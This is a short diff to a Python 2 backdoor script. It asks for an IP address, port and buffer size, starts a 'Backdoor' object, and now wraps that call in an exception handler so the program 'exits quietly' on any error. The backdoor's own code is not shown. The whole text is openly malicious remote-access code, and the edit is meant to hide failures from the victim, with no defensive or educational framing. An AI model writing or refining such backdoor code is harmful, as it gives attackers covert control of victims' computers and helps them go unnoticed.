@@ -82,8 +82,12 @@ ip = raw_input("Enter IP Address: ")
 port = int(raw_input("Enter port number to use: "))
 buffer_size = int(raw_input("Enter buffer size: "))
 
-my_backdoor = Backdoor(ip, port)
-my_backdoor.run()
+try:
+    my_backdoor = Backdoor(ip, port)
+    my_backdoor.run()
+except Exception: #Exception = any type of error that occurs when trying to run program
+    sys.exit() #exit quietly
+    
 
 
 
